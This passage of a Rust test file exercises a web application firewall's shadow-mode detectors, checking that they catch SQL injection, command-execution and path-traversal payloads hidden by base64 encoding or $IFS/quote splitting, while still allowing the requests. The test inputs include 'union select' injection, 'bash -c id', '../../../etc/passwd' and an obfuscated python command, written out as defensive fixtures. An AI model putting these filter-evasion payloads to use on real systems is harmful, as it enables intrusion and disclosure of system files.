/// + structural detector catches it. In shadow mode this must still NOT block.
fn base64_union_payload() -> String {
    base64::engine::general_purpose::STANDARD.encode("1 union select null,null,null from users")
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn shadow_sqli_encoding_bypass_detected_but_not_blocked() {
    let baseline = engine().await; // Lane 2 off
    let (shadow, db) = engine_with_shadow_sqli().await; // Lane 2 SQLi, log_only

    // Body is a pure base64 blob → legacy sees gibberish (no SQL keywords) and
    // does not block; both engines must reach the identical final action.
    let payload = base64_union_payload();
    let mut a = make_ctx("", &payload, false);

    // Unique host_code so we can read back THIS request's observation and prove
    // detection actually happened (codex A-5: not a vacuous "clean stays clean").
    let host_code = format!("p1b-bypass-{}", uuid_like());
    let mut b = make_ctx("", &payload, false);
    Arc::make_mut(&mut b.host_config).code = host_code.clone();

    let da = baseline.inspect_body(&mut a).await;
    let db_dec = shadow.inspect_body(&mut b).await;

    assert!(
        da.is_allowed(),
        "baseline (Lane 2 off) must allow the base64-wrapped payload — legacy never decodes it: {:?}",
        da.action
    );
    // 1) Final action is identical to the Lane-2-off baseline (shadow never blocks).
    assert_eq!(
        action_kind(&da),
        action_kind(&db_dec),
        "shadow SQLi detection must NOT change the final action (log_only never blocks)"
    );
    // 2) The suffix pipeline ran to completion (request allowed, not short-circuited).
    assert!(db_dec.is_allowed(), "shadow mode must still allow the request");
    // 3) Detection was NON-EMPTY: a de-identified observation for this request was
    //    persisted through the bounded sink — proving the base64 blind decode +
    //    structural detector actually fired (not a silent no-op).
    let mut rows = Vec::new();
    for _ in 0..40 {
        rows = db
            .list_semantic_observations(SemanticObservationQuery {
                host_code: Some(host_code.clone()),
                page: Some(1),
                page_size: Some(10),
            })
            .await
            .expect("list observations");
        if !rows.is_empty() {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    }
    assert_eq!(
        rows.len(),
        1,
        "detection must persist exactly one observation (non-empty proof)"
    );
    let row = rows.first().expect("one row");
    let arr = row.observations.as_array().expect("observations array");
    assert!(
        arr.iter()
            .any(|s| s.get("provenance").and_then(|v| v.as_str()) == Some("blind_decoded")),
        "the winning view must be the base64 blind decode: {:?}",
        row.observations
    );
}

/// Build an engine with the Lane 2 `SQLi` family enabled in **enforce** mode.
/// In P1b the scorer is deliberately not wired to the block path, so `enforce`
/// must behave exactly like `log_only` at the engine dispatch: detect + persist,
/// NEVER block (codex A-2 / A-5).
async fn engine_with_enforce_sqli() -> (WafEngine, Arc<Database>) {
    let db = Arc::new(Database::connect(&database_url(), 5).await.expect("connect Postgres"));
    db.migrate().await.expect("migrate");
    let mut weights = std::collections::BTreeMap::new();
    weights.insert("struct_rule".to_string(), 1.0);
    let mut attacks = std::collections::BTreeMap::new();
    attacks.insert(
        "sql_injection".to_string(),
        waf_common::content_security_config::SemanticAttackConfig {
            enabled: true,
            weights,
            log_threshold: 40,
            block_threshold: 80,
            hard_veto_allowlist: Vec::new(),
        },
    );
    let cfg = ContentSecurityConfig {
        enabled: true,
        enforcement_mode: "enforce".to_string(),
        rollout_bps: 10_000, // 100% canary — the most aggressive posture
        attacks,
        ..ContentSecurityConfig::default()
    };
    let content_security = RuntimeContentSecurityConfig::compile(&cfg).expect("valid semantic config");
    let eng = WafEngine::new(
        Arc::clone(&db),
        WafEngineConfig {
            content_security,
            ..WafEngineConfig::default()
        },
    );
    (eng, db)
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn enforce_mode_still_never_blocks_in_p1b() {
    let baseline = engine().await; // Lane 2 off
    let (enforce, _db) = engine_with_enforce_sqli().await; // Lane 2 SQLi, enforce (100% canary)

    // A base64-wrapped union-select payload the legacy lane never decodes. Even in
    // enforce mode with a 100% canary, P1b must NOT block (scorer not wired to the
    // block path) — the final action must match the Lane-2-off baseline.
    let payload = base64_union_payload();
    let mut a = make_ctx("", &payload, false);
    let mut b = make_ctx("", &payload, false);
    let da = baseline.inspect_body(&mut a).await;
    let db_dec = enforce.inspect_body(&mut b).await;

    assert!(da.is_allowed(), "baseline must allow the base64 payload");
    assert_eq!(
        action_kind(&da),
        action_kind(&db_dec),
        "enforce mode must NOT change the final action in P1b (scorer not wired to block)"
    );
    assert!(
        db_dec.is_allowed(),
        "enforce mode in P1b must still allow (shadow only)"
    );
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn shadow_sqli_persists_observation_roundtrip() {
    let (shadow, db) = engine_with_shadow_sqli().await;

    // A unique host_code isolates this test's observations from any other rows.
    let host_code = format!("p1b-obs-{}", uuid_like());
    let payload = base64_union_payload();
    let host_config = Arc::new(HostConfig {
        code: host_code.clone(),
        host: "example.com".to_string(),
        guard_status: true,
        log_only_mode: false,
        ..HostConfig::default()
    });
    let mut headers = HashMap::new();
    headers.insert("user-agent".to_string(), "Mozilla/5.0 (p1b-obs)".to_string());
    let mut ctx = RequestCtx {
        req_id: "p1b-obs".to_string(),
        client_ip: "198.51.100.9".parse().expect("ip"),
        client_port: 12345,
        method: "POST".to_string(),
        host: "example.com".to_string(),
        port: 80,
        path: "/".to_string(),
        query: String::new(),
        headers,
        body_preview: Bytes::from(payload),
        content_length: 0,
        is_tls: false,
        host_config,
        geo: None,
    };
    let decision = shadow.inspect_body(&mut ctx).await;
    assert!(decision.is_allowed(), "shadow SQLi must not block the observation test");

    // Persistence is fire-and-forget on a spawned task; poll until the row lands.
    let mut rows = Vec::new();
    for _ in 0..40 {
        rows = db
            .list_semantic_observations(SemanticObservationQuery {
                host_code: Some(host_code.clone()),
                page: Some(1),
                page_size: Some(10),
            })
            .await
            .expect("list observations");
        if !rows.is_empty() {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    }
    assert_eq!(rows.len(), 1, "exactly one semantic observation must be persisted");
    let row = rows.first().expect("one row");
    assert_eq!(row.scope, "body");
    assert_eq!(row.pipeline, "semantic");
    assert_eq!(row.schema_version, 1);
    assert!(
        row.request_score >= 40,
        "union-based hit should score at/above log threshold"
    );
    assert!(
        matches!(row.recommendation.as_str(), "log" | "block"),
        "recommendation should be log/block (shadow logs it, never enforces): {}",
        row.recommendation
    );
    // De-identified signal breakdown: a base64 blind-decoded SQL structural rule.
    let arr = row.observations.as_array().expect("observations is a JSON array");
    assert!(!arr.is_empty(), "at least one signal must be recorded");
    assert!(
        arr.iter().any(|s| s
            .get("rule_key")
            .and_then(|v| v.as_str())
            .is_some_and(|k| k.starts_with("sql."))),
        "a structural SQL rule_key must be present: {:?}",
        row.observations
    );
    assert!(
        arr.iter()
            .any(|s| s.get("provenance").and_then(|v| v.as_str()) == Some("blind_decoded")),
        "the winning view came through base64 blind decode: {:?}",
        row.observations
    );
    // De-identification: only the fixed structural vocabulary (rule_key etc.) is
    // stored — never the per-signal `detail` text nor raw attacker payload tokens.
    // NB `rule_key` values like "sql.union_null" legitimately contain "union"; the
    // check targets payload-specific fragments that only appear in the raw input.
    let json = row.observations.to_string();
    assert!(!json.contains("detail"), "detail must not be persisted");
    assert!(
        !json.contains("from users"),
        "raw payload must not be persisted: {json}"
    );
    assert!(
        !json.contains("null,null"),
        "raw payload column list must not be persisted: {json}"
    );
}

/// Small unique-ish suffix for test isolation (avoids a uuid dev-dep here).
fn uuid_like() -> u128 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now().duration_since(UNIX_EPOCH).map_or(0, |d| d.as_nanos())
}

// ── P1c: real RCE + Traversal detectors in SHADOW mode (codex A-2/A-3/A-4) ────

/// Build an engine with the Lane 2 `rce` AND `traversal` families enabled in the
/// default P1c shadow posture (`enforcement_mode = log_only`). Returns the engine
/// + its DB handle so a test can read back persisted observations.
async fn engine_with_shadow_rce_traversal() -> (WafEngine, Arc<Database>) {
    let db = Arc::new(Database::connect(&database_url(), 5).await.expect("connect Postgres"));
    db.migrate().await.expect("migrate");
    let family = |detector: &str| {
        let mut weights = std::collections::BTreeMap::new();
        weights.insert(detector.to_string(), 1.0);
        waf_common::content_security_config::SemanticAttackConfig {
            enabled: true,
            weights,
            log_threshold: 40,
            block_threshold: 80,
            hard_veto_allowlist: Vec::new(),
        }
    };
    let mut attacks = std::collections::BTreeMap::new();
    attacks.insert("rce".to_string(), family("rce"));
    attacks.insert("traversal".to_string(), family("traversal"));
    let cfg = ContentSecurityConfig {
        enabled: true,
        enforcement_mode: "log_only".to_string(),
        attacks,
        ..ContentSecurityConfig::default()
    };
    let content_security = RuntimeContentSecurityConfig::compile(&cfg).expect("valid semantic config");
    let eng = WafEngine::new(
        Arc::clone(&db),
        WafEngineConfig {
            content_security,
            ..WafEngineConfig::default()
        },
    );
    (eng, db)
}

/// Poll `semantic_observations` for `host_code` until a row lands (fire-and-forget
/// persistence), returning the rows (possibly empty after the retry budget).
async fn wait_for_observation(db: &Database, host_code: &str) -> Vec<waf_storage::models::SemanticObservation> {
    let mut rows = Vec::new();
    for _ in 0..40 {
        rows = db
            .list_semantic_observations(SemanticObservationQuery {
                host_code: Some(host_code.to_string()),
                page: Some(1),
                page_size: Some(10),
            })
            .await
            .expect("list observations");
        if !rows.is_empty() {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    }
    rows
}

/// Assert a persisted observation exists for `host_code` carrying a signal of the
/// expected `attack` on a `blind_decoded` view — the proof that the Lane-2 decode
/// chain (base64 / shell normalise) actually fired.
fn assert_blind_signal(row: &waf_storage::models::SemanticObservation, attack: &str) {
    let arr = row.observations.as_array().expect("observations array");
    assert!(
        arr.iter().any(|s| {
            s.get("attack").and_then(|v| v.as_str()) == Some(attack)
                && s.get("provenance").and_then(|v| v.as_str()) == Some("blind_decoded")
        }),
        "a {attack} signal on a blind_decoded view must be present: {:?}",
        row.observations
    );
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn shadow_rce_base64_bypass_detected_but_not_blocked() {
    // codex A-2 acceptance (RCE): base64("bash -c id") — a pure blob the frozen
    // Lane 1 (and CRS) never decode — is detected by the Lane-2 base64 blind gate
    // + RCE detector, yet in shadow it must NOT block; the suffix runs to allow.
    let baseline = engine().await; // Lane 2 off
    let (shadow, db) = engine_with_shadow_rce_traversal().await;
    let payload = base64::engine::general_purpose::STANDARD.encode("bash -c id");

    let mut a = make_ctx("", &payload, false);
    let host_code = format!("p1c-rce-{}", uuid_like());
    let mut b = make_ctx("", &payload, false);
    Arc::make_mut(&mut b.host_config).code = host_code.clone();

    let da = baseline.inspect_body(&mut a).await;
    let db_dec = shadow.inspect_body(&mut b).await;
    assert!(
        da.is_allowed(),
        "baseline must allow the base64 RCE blob: {:?}",
        da.action
    );
    assert_eq!(
        action_kind(&da),
        action_kind(&db_dec),
        "shadow RCE detection must not change the final action"
    );
    assert!(db_dec.is_allowed(), "shadow RCE must still allow (suffix continues)");

    let rows = wait_for_observation(&db, &host_code).await;
    assert_eq!(rows.len(), 1, "detection must persist exactly one observation");
    assert_blind_signal(rows.first().expect("row"), "rce");
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn shadow_traversal_base64_bypass_detected_but_not_blocked() {
    // codex A-2 acceptance (Traversal): base64("../../../etc/passwd") — invisible
    // to Lane 1 — is detected by the base64 blind gate + Traversal T1 detector,
    // yet shadow keeps it advisory (no block, suffix continues).
    let baseline = engine().await;
    let (shadow, db) = engine_with_shadow_rce_traversal().await;
    let payload = base64::engine::general_purpose::STANDARD.encode("../../../etc/passwd");

    let mut a = make_ctx("", &payload, false);
    let host_code = format!("p1c-trav-{}", uuid_like());
    let mut b = make_ctx("", &payload, false);
    Arc::make_mut(&mut b.host_config).code = host_code.clone();

    let da = baseline.inspect_body(&mut a).await;
    let db_dec = shadow.inspect_body(&mut b).await;
    assert!(
        da.is_allowed(),
        "baseline must allow the base64 traversal blob: {:?}",
        da.action
    );
    assert_eq!(
        action_kind(&da),
        action_kind(&db_dec),
        "shadow must not change the action"
    );
    assert!(db_dec.is_allowed(), "shadow traversal must still allow");

    let rows = wait_for_observation(&db, &host_code).await;
    assert_eq!(rows.len(), 1, "detection must persist exactly one observation");
    assert_blind_signal(rows.first().expect("row"), "traversal");
}

#[tokio::test]
#[ignore = "requires live Postgres; run with --ignored"]
async fn shadow_rce_shell_normalised_bypass_detected_but_not_blocked() {
    // codex A-3 acceptance: a quote/`$IFS`-split `python3 -c id`. Lane 1's
    // URL-decode-only path never reveals it; the shell-normalise gate (now built
    // from the default-on RCE rules) surfaces a BlindDecoded view and the detector
    // fires. OWASP/sensitive suffix is disabled on the host to isolate the Lane-2
    // increment (its $IFS command-injection rules would otherwise mask the test);
    // the request must stay allowed and persist an RCE blind observation.
    let (shadow, db) = engine_with_shadow_rce_traversal().await;
    let host_code = format!("p1c-shell-{}", uuid_like());
    let mut b = make_ctx("", "cmd=pyth''on3$IFS-c$IFSid", false);
    {
        let hc = Arc::make_mut(&mut b.host_config);
        hc.code = host_code.clone();
        hc.defense_config.owasp_set = false;
        hc.defense_config.sensitive = false;
    }
    let d = shadow.inspect_body(&mut b).await;
    assert!(
        d.is_allowed(),
        "shell-normalised RCE must stay allowed in shadow (suffix disabled): {:?}",
        d.action
    );
    let rows = wait_for_observation(&db, &host_code).await;
    assert_eq!(rows.len(), 1, "detection must persist exactly one observation");
    assert_blind_signal(rows.first().expect("row"), "rce");
}
